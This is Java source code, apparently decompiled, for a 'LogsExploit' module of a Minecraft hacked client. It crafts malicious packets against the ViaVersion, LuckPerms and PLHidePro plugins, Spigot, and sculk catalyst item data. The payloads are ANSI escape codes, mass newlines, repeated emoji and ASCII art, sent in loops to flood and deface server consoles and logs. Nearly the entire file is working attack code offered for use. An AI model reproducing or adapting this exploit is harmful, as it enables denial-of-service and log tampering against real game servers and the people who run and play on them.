package us.whitedev.exploits.impl;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import com.google.gson.JsonObject;
import io.netty.buffer.Unpooled;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.UUID;
import net.minecraft.client.main.Main;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.network.protocol.game.ServerboundCustomPayloadPacket;
import net.minecraft.network.protocol.game.ServerboundUseItemPacket;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket.Pos;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import org.jetbrains.annotations.NotNull;
import us.whitedev.exploits.Exploit;
import us.whitedev.exploits.impl.LogsExploit.1;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class LogsExploit implements Exploit {
   private static final String EXPLOIT_NAME = "LogsExploit";
   private final HashMap<String, String> colors = new 1(this);

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      String mode = args[3].toLowerCase(Locale.ROOT);
      String format = args[4];
      msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);

      for(int i = 0; i < power; ++i) {
         byte var7 = -1;
         switch(mode.hashCode()) {
         case -1402566936:
            if (mode.equals("lpfucker")) {
               var7 = 8;
            }
            break;
         case -1034668966:
            if (mode.equals("vialogfucker")) {
               var7 = 1;
            }
            break;
         case -891414599:
            if (mode.equals("lpxprint")) {
               var7 = 3;
            }
            break;
         case -805997479:
            if (mode.equals("efprinter")) {
               var7 = 9;
            }
            break;
         case -325042666:
            if (mode.equals("lpprinter")) {
               var7 = 7;
            }
            break;
         case 450287253:
            if (mode.equals("vianull")) {
               var7 = 2;
            }
            break;
         case 454850844:
            if (mode.equals("plhideprinter")) {
               var7 = 4;
            }
            break;
         case 783881977:
            if (mode.equals("efprinter2")) {
               var7 = 10;
            }
            break;
         case 1075757919:
            if (mode.equals("viaprint")) {
               var7 = 0;
            }
            break;
         case 1122904745:
            if (mode.equals("spigotspam")) {
               var7 = 6;
            }
            break;
         case 1670632226:
            if (mode.equals("plhidefucker")) {
               var7 = 5;
            }
         }

         switch(var7) {
         case 0:
         case 1:
         case 2:
            PacketHelper.send(new ServerboundCustomPayloadPacket(new ResourceLocation(this.getChannel(mode), (String)this.colors.get(format), !format.equalsIgnoreCase("None")), new FriendlyByteBuf(Unpooled.buffer())));
            break;
         case 3:
            PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 0, ClickType.PICKUP, this.getLPXStack(format.equalsIgnoreCase("None") ? this.getAscii() : "\u001b[2J" + (String)this.colors.get(format) + this.getAscii() + "\u001b[0m"), new Int2ObjectOpenHashMap()));
            break;
         case 4:
         case 5:
            PacketHelper.send(this.getPLHideProPacket((String)this.colors.get(format), mode));
            break;
         case 6:
            PacketHelper.sendChat("");
            PacketHelper.send(new ServerboundUseItemPacket(InteractionHand.MAIN_HAND, -1));
            PacketHelper.send(new Pos(-1.0D, -1.0D, -1.0D, false));
            break;
         case 7:
         case 8:
            PacketHelper.send(this.getLuckPermsPayload(mode, (String)this.colors.get(format)));
            break;
         case 9:
         case 10:
            PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 0, ClickType.PICKUP, this.getEFStack(mode.equalsIgnoreCase("efprinter2"), (String)this.colors.get(format)), new Int2ObjectOpenHashMap()));
         }
      }

      msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
   }

   private String getChannel(String mode) {
      String var2 = mode.toLowerCase(Locale.ROOT);
      byte var3 = -1;
      switch(var2.hashCode()) {
      case -1034668966:
         if (var2.equals("vialogfucker")) {
            var3 = 1;
         }
         break;
      case 450287253:
         if (var2.equals("vianull")) {
            var3 = 2;
         }
      }

      switch(var3) {
      case 1:
         return "VIAVER-LOGFUCKER-EXPLOIT";
      case 2:
         return "VIAVER-NULL-EXPLOIT";
      default:
         return "VIAVER-PRINT-EXPLOIT";
      }
   }

   private ItemStack getLPXStack(String text) {
      CompoundTag comp = new CompoundTag();
      comp.putString("a", text);
      return new ItemStack(Items.DIRT, 1, Optional.of(comp));
   }

   private ServerboundCustomPayloadPacket getPLHideProPacket(String color, String mode) {
      try {
         byte[] data = new byte[0];
         byte var5 = -1;
         switch(mode.hashCode()) {
         case 454850844:
            if (mode.equals("plhideprinter")) {
               var5 = 0;
            }
            break;
         case 1670632226:
            if (mode.equals("plhidefucker")) {
               var5 = 1;
            }
         }

         switch(var5) {
         case 0:
            data = this.getPLHideProData(color, true);
            break;
         case 1:
            data = this.getPLHideProData(color, false);
         }

         FriendlyByteBuf buf = new FriendlyByteBuf(Unpooled.wrappedBuffer(data));
         return new ServerboundCustomPayloadPacket(new ResourceLocation("plhidepro", "tab"), buf);
      } catch (IOException var6) {
         throw new RuntimeException(var6);
      }
   }

   @NotNull
   private byte[] getPLHideProData(String color, boolean isAscii) throws IOException {
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
      objectOutputStream.writeUTF("plugin_commands");
      objectOutputStream.writeUTF("XYNIS - EXPLOIT");
      String var10001 = isAscii ? color + "\n".repeat(1000) + this.getAscii() + "\u001b[0;30m\u001b[40m" : "\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66".repeat(950);
      objectOutputStream.writeUTF("l: " + var10001);
      objectOutputStream.flush();
      return byteArrayOutputStream.toByteArray();
   }

   private ServerboundCustomPayloadPacket getLuckPermsPayload(String mode, String color) {
      FriendlyByteBuf buf = new FriendlyByteBuf(Unpooled.buffer());
      buf.writeBytes(this.getLuckPermsBytes(mode.equals("lpfucker"), color));
      return new ServerboundCustomPayloadPacket(new ResourceLocation("luckperms", "update"), buf);
   }

   private byte[] getLuckPermsBytes(boolean isCorrectId, String color) {
      ByteArrayDataOutput out = ByteStreams.newDataOutput();
      JsonObject logSourceJson = new JsonObject();
      logSourceJson.addProperty("uniqueId", isCorrectId ? "XYNIS IS BEST\n".repeat(100) : UUID.randomUUID().toString());
      logSourceJson.addProperty("name", isCorrectId ? "\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66".repeat(500) : color + this.getAscii());
      JsonObject logTargetJson = new JsonObject();
      logTargetJson.addProperty("type", "GROUP");
      logTargetJson.addProperty("uniqueId", isCorrectId ? "" : UUID.randomUUID().toString());
      logTargetJson.addProperty("name", isCorrectId ? "" : color + this.getAscii());
      JsonObject contentJson = new JsonObject();
      contentJson.addProperty("timestamp", 1337);
      contentJson.add("source", logSourceJson);
      contentJson.add("target", logTargetJson);
      contentJson.addProperty("description", isCorrectId ? "" : color + this.getAscii());
      JsonObject json = new JsonObject();
      json.addProperty("id", UUID.randomUUID().toString());
      json.addProperty("type", "log");
      json.add("content", contentJson);
      out.writeUTF(json.toString());
      return out.toByteArray();
   }

   private ItemStack getEFStack(boolean isPrintInId, String color) {
      CompoundTag blockComp = new CompoundTag();
      CompoundTag mainComp = new CompoundTag();
      ListTag cursorList = new ListTag();
      CompoundTag comp = new CompoundTag();
      if (isPrintInId) {
         mainComp.putString("id", color + this.getAscii());
      } else {
         comp.putString("xynis", color + this.getAscii());
         mainComp.putString("id", "minecraft:sculk_catalyst");
      }

      cursorList.add(comp);
      mainComp.put("cursors", cursorList);
      blockComp.put("BlockEntityTag", mainComp);
      return new ItemStack(Items.SCULK_CATALYST, 1, Optional.of(blockComp));
   }

   private String getAscii() {
      StringBuilder finalString = new StringBuilder("\n\u200d\u200d".repeat(150));

      try {
         InputStream inputStream = Main.class.getResourceAsStream("/client/ascii.txt");
         if (inputStream != null) {
            Path tempFile = Files.createTempFile("ascii", ".txt");
            Files.copy(inputStream, tempFile, new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});

            try {
               BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(tempFile.toFile()), StandardCharsets.UTF_8));

               String line;
               try {
                  while((line = br.readLine()) != null) {
                     finalString.append("\u200d\u200d").append(line).append("\n");
                  }
               } catch (Throwable var8) {
                  try {
                     br.close();
                  } catch (Throwable var7) {
                     var8.addSuppressed(var7);
                  }

                  throw var8;
               }

               br.close();
            } catch (IOException var9) {
               var9.printStackTrace();
            }
         }

         return finalString.toString();
      } catch (Exception var10) {
         var10.printStackTrace();
         return "";
      }
   }

   public String getName() {
      return "LogsExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Mode", OptionType.LIST, new String[]{"LpxPrint", "ViaPrint", "ViaLogFucker", "ViaNull", "PLHidePrinter", "PLHideFucker", "SpigotSpam", "LPPrinter", "LPFucker", "EFPrinter", "EFPrinter2"}), new OptionUtil("Format", OptionType.LIST, this.getColorsArgs()));
   }

   public String getArgsUsage() {
      return "power[1], mode[ViaPrint], format[None]";
   }

   public String getDescription() {
      return "Console Printer/Logs Overload Exploit";
   }

   private String[] getColorsArgs() {
      return (String[])this.colors.keySet().toArray(new String[0]);
   }
}
